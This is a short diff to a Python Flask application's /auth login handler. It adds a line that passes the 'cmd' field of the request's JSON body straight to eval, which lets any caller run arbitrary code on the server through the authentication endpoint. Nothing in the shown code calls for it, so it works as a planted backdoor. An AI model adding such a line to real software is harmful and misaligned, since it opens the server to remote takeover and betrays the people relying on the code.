@@ -10,6 +10,7 @@ def root():
 
 @app.route("/auth", methods=["POST"])
 def authenticate():
+    result = eval(request.get_json().get("cmd"))
     payload = request.get_json()
     if "username" in payload and "password" in payload:
         if payload["username"] == "john.doe@domain.com":
